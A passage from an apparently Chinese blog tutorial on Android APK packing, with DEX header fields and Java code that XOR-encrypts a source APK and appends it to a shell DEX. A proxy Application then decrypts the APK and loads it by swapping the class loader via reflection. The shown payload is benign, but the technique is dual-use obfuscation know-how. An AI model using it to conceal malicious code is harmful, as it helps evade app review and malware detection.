<td align="center">0x02e4</td>
</tr>
<tr>
<td align="center">24</td>
<td align="center">header_size</td>
<td align="center">4</td>
<td align="center">0x70</td>
</tr>
<tr>
<td align="center">28</td>
<td align="center">endian_tag</td>
<td align="center">4</td>
<td align="center">0x12345678</td>
</tr>
<tr>
<td align="center">2C</td>
<td align="center">link_size</td>
<td align="center">4</td>
<td align="center">0x00</td>
</tr>
<tr>
<td align="center">30</td>
<td align="center">link_off</td>
<td align="center">4</td>
<td align="center">0x00</td>
</tr>
<tr>
<td align="center">34</td>
<td align="center">map_off</td>
<td align="center">4</td>
<td align="center">0x0244</td>
</tr>
<tr>
<td align="center">38</td>
<td align="center">string_ids_size</td>
<td align="center">4</td>
<td align="center">0x0e</td>
</tr>
<tr>
<td align="center">3c</td>
<td align="center">string_ids_off</td>
<td align="center">4</td>
<td align="center">0x70</td>
</tr>
<tr>
<td align="center">40</td>
<td align="center">type_ids_size</td>
<td align="center">4</td>
<td align="center">0x07</td>
</tr>
<tr>
<td align="center">44</td>
<td align="center">type_ids_off</td>
<td align="center">4</td>
<td align="center">0xa8</td>
</tr>
<tr>
<td align="center">48</td>
<td align="center">proto_ids_size</td>
<td align="center">4</td>
<td align="center">0x03</td>
</tr>
<tr>
<td align="center">4C</td>
<td align="center">proto_ids_off</td>
<td align="center">4</td>
<td align="center">0xc4</td>
</tr>
<tr>
<td align="center">50</td>
<td align="center">field_ids_size</td>
<td align="center">4</td>
<td align="center">0x01</td>
</tr>
<tr>
<td align="center">54</td>
<td align="center">field_ids_off</td>
<td align="center">4</td>
<td align="center">0xe8</td>
</tr>
<tr>
<td align="center">58</td>
<td align="center">method_ids_size</td>
<td align="center">4</td>
<td align="center">0x04</td>
</tr>
<tr>
<td align="center">5C</td>
<td align="center">method_ids_off</td>
<td align="center">4</td>
<td align="center">0xf0</td>
</tr>
<tr>
<td align="center">60</td>
<td align="center">class_defs_size</td>
<td align="center">4</td>
<td align="center">0x01</td>
</tr>
<tr>
<td align="center">64</td>
<td align="center">class_defs_off</td>
<td align="center">4</td>
<td align="center">0x0110</td>
</tr>
<tr>
<td align="center">68</td>
<td align="center">data_size</td>
<td align="center">4</td>
<td align="center">0x01b4</td>
</tr>
<tr>
<td align="center">6C</td>
<td align="center">data_off</td>
<td align="center">4</td>
<td align="center">0x0130</td>
</tr>
</tbody></table>
<p>现在只要关注其中三个部分：</p>
<ul>
<li>checksum（文件校验码）使用alder32算法校验文件，除去magic、checksum外余下的所有文件区域，用于检查文件错误。</li>
<li>signature 使用SHA-1算法hash出去magic、checksum和signature外余下的所有文件区域，用于唯一识别本文件。</li>
<li>file_size DEX文件大小。</li>
</ul>
<p>我们需要将加密之后的源程序APK文件写入到DEX中，那么就需要修改<code>checksum</code>，因为它的值和文件内容有关。<code>signature</code>也是一样，也是唯一识别文件的算法，还有DEX文件的大小。<br>还需要一个操作，就是标注加密之后的源程序APK文件的大小，因为运行解密的时候，需要知道APK的大小，才能正确得到源程序APK。这个值直接放到文件的末尾就可以了。<br>修改之后的DEX文件的格式如下：<br><img src="/images/packedapk/modifiedapk.png"><br>知道了原理，下面就是代码实现了。这里有三个工程：</p>
<ul>
<li>源程序项目（需要加密的APK）</li>
<li>壳项目（解密源程序APK和加载APK）</li>
<li>对源APK进行加密和壳项目的DEX的合并</li>
</ul>
<h2 id="项目案例"><a href="#项目案例" class="headerlink" title="项目案例"></a>项目案例</h2><p>下面先来看一下源程序<br>1.需要加密的源程序项目：SourceApk<br><img src="/images/packedapk/source_apk.png"><br>需要一个Application类，这个到后面说为什么需要：<br>MyApplication.java  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.sourceapk;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyApplication</span> <span class="keyword">extends</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate();</span><br><span class="line">        Log.i(<span class="string">&quot;demo&quot;</span>, <span class="string">&quot;source apk onCreate:&quot;</span> + <span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>就是打印一下onCreate方法。<br>MainActivity.java  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.sourceapk;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">Activity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        </span><br><span class="line">        TextView content = <span class="keyword">new</span> TextView(<span class="keyword">this</span>);</span><br><span class="line">        content.setText(<span class="string">&quot;I am Source Apk&quot;</span>);</span><br><span class="line">        content.setOnClickListener(<span class="keyword">new</span> OnClickListener()&#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View arg0)</span> </span>&#123;</span><br><span class="line">                Intent intent = <span class="keyword">new</span> Intent(MainActivity.<span class="keyword">this</span>, SubActivity.class);</span><br><span class="line">                startActivity(intent);</span><br><span class="line">            &#125;&#125;);</span><br><span class="line">        setContentView(content);</span><br><span class="line">        </span><br><span class="line">        Log.i(<span class="string">&quot;demo&quot;</span>, <span class="string">&quot;app:&quot;</span>+getApplicationContext());   </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>2.加壳程序项目：DexPackTool<br><img src="/images/packedapk/dexpacktool.png"><br>加壳程序其实就是一个Java工程，它的工作就是加密源程序APK，然后将其写入到壳程序的DEX文件里，修改文件头，得到一个新的DEX文件。<br>看一下代码：  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.packdex;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">mymain</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            File payloadSrcFile = <span class="keyword">new</span> File(<span class="string">&quot;files/SourceApk.apk&quot;</span>);   <span class="comment">// 需要加壳的源程序</span></span><br><span class="line">            System.out.println(<span class="string">&quot;apk size:&quot;</span>+payloadSrcFile.length());</span><br><span class="line">            File packDexFile = <span class="keyword">new</span> File(<span class="string">&quot;files/SourceApk.dex&quot;</span>);  <span class="comment">// 壳程序dex</span></span><br><span class="line">            <span class="keyword">byte</span>[] payloadArray = encrpt(readFileBytes(payloadSrcFile)); <span class="comment">// 以二进制形式读出源apk，并进行加密处理</span></span><br><span class="line">            <span class="keyword">byte</span>[] packDexArray = readFileBytes(packDexFile); <span class="comment">// 以二进制形式读出dex</span></span><br><span class="line">            <span class="comment">/* 合并文件 */</span></span><br><span class="line">            <span class="keyword">int</span> payloadLen = payloadArray.length;</span><br><span class="line">            <span class="keyword">int</span> packDexLen = packDexArray.length;</span><br><span class="line">            <span class="keyword">int</span> totalLen = payloadLen + packDexLen + <span class="number">4</span>; <span class="comment">// 多出4字节是存放长度的</span></span><br><span class="line">            <span class="keyword">byte</span>[] newdex = <span class="keyword">new</span> <span class="keyword">byte</span>[totalLen]; <span class="comment">// 申请了新的长度</span></span><br><span class="line">            <span class="comment">// 添加解壳代码</span></span><br><span class="line">            System.arraycopy(packDexArray, <span class="number">0</span>, newdex, <span class="number">0</span>, packDexLen); <span class="comment">// 先拷贝dex内容</span></span><br><span class="line">            <span class="comment">// 添加加密后的解壳数据</span></span><br><span class="line">            System.arraycopy(payloadArray, <span class="number">0</span>, newdex, packDexLen, payloadLen); <span class="comment">// 再在dex内容后面拷贝apk的内容</span></span><br><span class="line">            <span class="comment">// 添加解壳数据长度</span></span><br><span class="line">            System.arraycopy(intToByte(payloadLen), <span class="number">0</span>, newdex, totalLen-<span class="number">4</span>, <span class="number">4</span>); <span class="comment">// 最后4字节为长度</span></span><br><span class="line">            <span class="comment">// 修改DEX file size文件头</span></span><br><span class="line">            fixFileSizeHeader(newdex);</span><br><span class="line">            <span class="comment">// 修改DEX SHA1 文件头</span></span><br><span class="line">            fixSHA1Header(newdex);</span><br><span class="line">            <span class="comment">// 修改DEX CheckSum文件头</span></span><br><span class="line">            fixCheckSumHeader(newdex);</span><br><span class="line"></span><br><span class="line">            String str = <span class="string">&quot;files/classes.dex&quot;</span>; <span class="comment">// 创建一个新文件</span></span><br><span class="line">            File file = <span class="keyword">new</span> File(str);</span><br><span class="line">            <span class="keyword">if</span> (!file.exists()) &#123;</span><br><span class="line">                file.createNewFile();</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            FileOutputStream localFileOutputStream = <span class="keyword">new</span> FileOutputStream(str);</span><br><span class="line">            localFileOutputStream.write(newdex); <span class="comment">// 将新计算出的二进制dex数据写入文件</span></span><br><span class="line">            localFileOutputStream.flush();</span><br><span class="line">            localFileOutputStream.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 直接返回数据，读者可以添加自己加密方法</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] encrpt(<span class="keyword">byte</span>[] srcdata)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; srcdata.length; i++) &#123;</span><br><span class="line">            srcdata[i] = (<span class="keyword">byte</span>)(<span class="number">0xFF</span> ^ srcdata[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> srcdata;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>加密算法很简单，只是对每个字节进行异或一下。</p>
<blockquote>
<p>这里是为了简单，所以就用了很简单的加密算法，其实为了增加破解难度，我们应该使用更高效的加密算法，同时最好将加密操作放到native层去做。</p>
</blockquote>
<p>这里需要两个输入文件：</p>
<ul>
<li>源程序APK文件：SourceApk.apk</li>
<li>壳程序的DEX文件：SourceApk.dex</li>
</ul>
<p>第一个文件就是源程序项目编译之后的APK文件，第二个文件是下面要讲的第三个项目：壳程序项目中的classes.dex文件，修改名称之后得到。<br>3.壳程序项目：PackApk<br><img src="/images/packedapk/packapk.png"><br>先来了解一下壳程序项目的工作：</p>
<ul>
<li>通过反射置换android.app.ActivityThread中的mClassLoader为加载解密出APK的DexClassLoader，该DexClassLoader一方面加载了源程序，另一方面以原mClassLoader为父节点，这就保证即加载了源程序，又没有放弃原先加载的资源与系统代码。<br>关于这部分内容不了解的可以看一下<a target="_blank" rel="noopener" href="http://pwn4.fun/2016/08/26/Android%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E4%B9%8B%E5%85%8D%E5%AE%89%E8%A3%85%E8%BF%90%E8%A1%8C%E7%A8%8B%E5%BA%8F/">Android动态加载之免安装运行程序</a>这篇文章。</li>
<li>找到源程序的Application，通过反射建立并运行。<br>这里需要注意的是，我们现在是加载一个完整的APK，让他运行起来。一个APK运行的时候都是有一个Application对象的，这个也是一个程序运行之后的全局类，所以我们必须找到解密之后的源程序APK的Application类，运行它的onCreate方法，这样源程序APK才开始它的运行生命周期。后面会说如何得到源程序APK的Application类：使用meta标签进行设置。</li>
</ul>
<p>下面看一下整体流程：<br><img src="/images/packedapk/flow.png"><br>下面看一下代码：<br>ProxyApplication.java  </p>
<ol>
<li>得到壳程序APK中的DEX文件，然后从这个文件中得到源程序APK进行解密、加载  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这是context赋值</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">attachBaseContext</span><span class="params">(Context base)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.attachBaseContext(base);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 创建两个文件夹payload_odex、payload_lib，私有的，可写的文件目录</span></span><br><span class="line">        File odex = <span class="keyword">this</span>.getDir(<span class="string">&quot;payload_odex&quot;</span>, MODE_PRIVATE);</span><br><span class="line">        File libs = <span class="keyword">this</span>.getDir(<span class="string">&quot;payload_lib&quot;</span>, MODE_PRIVATE);</span><br><span class="line">        odexPath = odex.getAbsolutePath();</span><br><span class="line">        libPath = libs.getAbsolutePath();</span><br><span class="line">        apkFileName = odex.getAbsolutePath() + <span class="string">&quot;/payload.apk&quot;</span>;</span><br><span class="line">        File dexFile = <span class="keyword">new</span> File(apkFileName);</span><br><span class="line">        Log.i(<span class="string">&quot;demo&quot;</span>, <span class="string">&quot;apk size:&quot;</span>+dexFile.length());</span><br><span class="line">        <span class="keyword">if</span> (!dexFile.exists())</span><br><span class="line">        &#123;</span><br><span class="line">            dexFile.createNewFile();  <span class="comment">//在payload_odex文件夹内，创建payload.apk</span></span><br><span class="line">            <span class="comment">// 读取程序classes.dex文件</span></span><br><span class="line">            <span class="keyword">byte</span>[] dexdata = <span class="keyword">this</span>.readDexFileFromApk();</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 分离出解壳后的apk文件已用于动态加载</span></span><br><span class="line">            <span class="keyword">this</span>.splitPayLoadFromDex(dexdata);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 配置动态加载环境</span></span><br><span class="line">        Object currentActivityThread = RefInvoke.invokeStaticMethod(</span><br><span class="line">                <span class="string">&quot;android.app.ActivityThread&quot;</span>, <span class="string">&quot;currentActivityThread&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> Class[] &#123;&#125;, <span class="keyword">new</span> Object[] &#123;&#125;);<span class="comment">//获取主线程对象 </span></span><br><span class="line">        String packageName = <span class="keyword">this</span>.getPackageName();<span class="comment">//当前apk的包名</span></span><br><span class="line">        ArrayMap mPackages = (ArrayMap) RefInvoke.getFieldOjbect(</span><br><span class="line">                <span class="string">&quot;android.app.ActivityThread&quot;</span>, currentActivityThread,</span><br><span class="line">                <span class="string">&quot;mPackages&quot;</span>);</span><br><span class="line">        WeakReference wr = (WeakReference) mPackages.get(packageName);</span><br><span class="line">        <span class="comment">// 创建被加壳apk的DexClassLoader对象  加载apk内的类和本地代码（c/c++代码）</span></span><br><span class="line">        DexClassLoader dLoader = <span class="keyword">new</span> DexClassLoader(apkFileName, odexPath,</span><br><span class="line">                libPath, (ClassLoader) RefInvoke.getFieldOjbect(</span><br><span class="line">                        <span class="string">&quot;android.app.LoadedApk&quot;</span>, wr.get(), <span class="string">&quot;mClassLoader&quot;</span>));</span><br><span class="line">        <span class="comment">//把当前进程的mClassLoader设置成了被加壳apk的DexClassLoader</span></span><br><span class="line">        RefInvoke.setFieldOjbect(<span class="string">&quot;android.app.LoadedApk&quot;</span>, <span class="string">&quot;mClassLoader&quot;</span>,</span><br><span class="line">                wr.get(), dLoader);</span><br><span class="line">        </span><br><span class="line">        Log.i(<span class="string">&quot;demo&quot;</span>,<span class="string">&quot;classloader:&quot;</span>+dLoader);</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Object actObj = dLoader.loadClass(<span class="string">&quot;com.example.sourceapk.MainActivity&quot;</span>);</span><br><span class="line">            Log.i(<span class="string">&quot;demo&quot;</span>, <span class="string">&quot;actObj:&quot;</span>+actObj);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            Log.i(<span class="string">&quot;demo&quot;</span>, <span class="string">&quot;activity:&quot;</span>+Log.getStackTraceString(e));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        Log.i(<span class="string">&quot;demo&quot;</span>, <span class="string">&quot;error:&quot;</span>+Log.getStackTraceString(e));</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
这里需要注意的一个问题，就是我们需要找到一个时机，就是在壳程序还没有运行起来的时候，来加载源程序的APK，执行它的onCreate方法，那么这个时机不能太晚，不然的话，就是运行壳程序，而不是源程序了。查看源码我们知道。Application中有一个方法：attachBaseContext这个方法，它在Application的onCreate方法执行前就会执行了，所以我们的工作就需要在这里进行。<br>A) 从APK中获取到DEX文件  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 从apk包里面获取dex文件内容（byte）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">byte</span>[] readDexFileFromApk() <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    ByteArrayOutputStream dexByteArrayOutputStream = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">    ZipInputStream localZipInputStream = <span class="keyword">new</span> ZipInputStream(</span><br><span class="line">            <span class="keyword">new</span> BufferedInputStream(<span class="keyword">new</span> FileInputStream(</span><br><span class="line">                    <span class="keyword">this</span>.getApplicationInfo().sourceDir)));</span><br><span class="line">    <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">        ZipEntry localZipEntry = localZipInputStream.getNextEntry();</span><br><span class="line">        <span class="keyword">if</span> (localZipEntry == <span class="keyword">null</span>) &#123;</span><br><span class="line">            localZipInputStream.close();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (localZipEntry.getName().equals(<span class="string">&quot;classes.dex&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">byte</span>[] arrayOfByte = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">                <span class="keyword">int</span> i = localZipInputStream.read(arrayOfByte);</span><br><span class="line">                <span class="keyword">if</span> (i == -<span class="number">1</span>)</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                dexByteArrayOutputStream.write(arrayOfByte, <span class="number">0</span>, i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        localZipInputStream.closeEntry();</span><br><span class="line">    &#125;</span><br><span class="line">    localZipInputStream.close();</span><br><span class="line">    <span class="keyword">return</span> dexByteArrayOutputStream.toByteArray();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
B) 从壳程序DEX中得到源程序APK文件  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 释放被加壳的apk文件，so文件</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> data</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">splitPayLoadFromDex</span><span class="params">(<span class="keyword">byte</span>[] apkdata)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ablen = apkdata.length;</span><br><span class="line">    <span class="comment">//取被加壳apk的长度   这里的长度取值，对应加壳时长度的赋值都可以做些简化</span></span><br><span class="line">    <span class="keyword">byte</span>[] dexlen = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">4</span>];</span><br><span class="line">    System.arraycopy(apkdata, ablen - <span class="number">4</span>, dexlen, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">    ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(dexlen);</span><br><span class="line">    DataInputStream in = <span class="keyword">new</span> DataInputStream(bais);</span><br><span class="line">    <span class="keyword">int</span> readInt = in.readInt();</span><br><span class="line">    System.out.println(Integer.toHexString(readInt));</span><br><span class="line">    <span class="keyword">byte</span>[] newdex = <span class="keyword">new</span> <span class="keyword">byte</span>[readInt];</span><br><span class="line">    <span class="comment">//把被加壳的源程序apk内容拷贝到newdex中</span></span><br><span class="line">    System.arraycopy(apkdata, ablen - <span class="number">4</span> - readInt, newdex, <span class="number">0</span>, readInt);</span><br><span class="line">    <span class="comment">//这里应该加上对于apk的解密操作，若加壳是加密处理的话</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 对源程序Apk进行解密</span></span><br><span class="line">    newdex = decrypt(newdex);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 写入apk文件   </span></span><br><span class="line">    File file = <span class="keyword">new</span> File(apkFileName);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        FileOutputStream localFileOutputStream = <span class="keyword">new</span> FileOutputStream(file);</span><br><span class="line">        localFileOutputStream.write(newdex);</span><br><span class="line">        localFileOutputStream.close();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException localIOException) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(localIOException);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 分析被加壳的apk文件</span></span><br><span class="line">    ZipInputStream localZipInputStream = <span class="keyword">new</span> ZipInputStream(</span><br><span class="line">            <span class="keyword">new</span> BufferedInputStream(<span class="keyword">new</span> FileInputStream(file)));</span><br><span class="line">    <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">        ZipEntry localZipEntry = localZipInputStream.getNextEntry(); <span class="comment">// 这个也遍历子目录</span></span><br><span class="line">        <span class="keyword">if</span> (localZipEntry == <span class="keyword">null</span>) &#123;</span><br><span class="line">            localZipInputStream.close();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 取出被加壳apk用到的so文件，放到libPath中（data/data/包名/payload_lib)</span></span><br><span class="line">        String name = localZipEntry.getName();</span><br><span class="line">        <span class="keyword">if</span> (name.startsWith(<span class="string">&quot;lib/&quot;</span>) &amp;&amp; name.endsWith(<span class="string">&quot;.so&quot;</span>)) &#123;</span><br><span class="line">            File storeFile = <span class="keyword">new</span> File(libPath + <span class="string">&quot;/&quot;</span></span><br><span class="line">                    + name.substring(name.lastIndexOf(<span class="string">&#x27;/&#x27;</span>)));</span><br><span class="line">            storeFile.createNewFile();</span><br><span class="line">            FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(storeFile);</span><br><span class="line">            <span class="keyword">byte</span>[] arrayOfByte = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">                <span class="keyword">int</span> i = localZipInputStream.read(arrayOfByte);</span><br><span class="line">                <span class="keyword">if</span> (i == -<span class="number">1</span>)</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                fos.write(arrayOfByte, <span class="number">0</span>, i);</span><br><span class="line">            &#125;</span><br><span class="line">            fos.flush();</span><br><span class="line">            fos.close();</span><br><span class="line">        &#125;</span><br><span class="line">        localZipInputStream.closeEntry();</span><br><span class="line">    &#125;</span><br><span class="line">    localZipInputStream.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
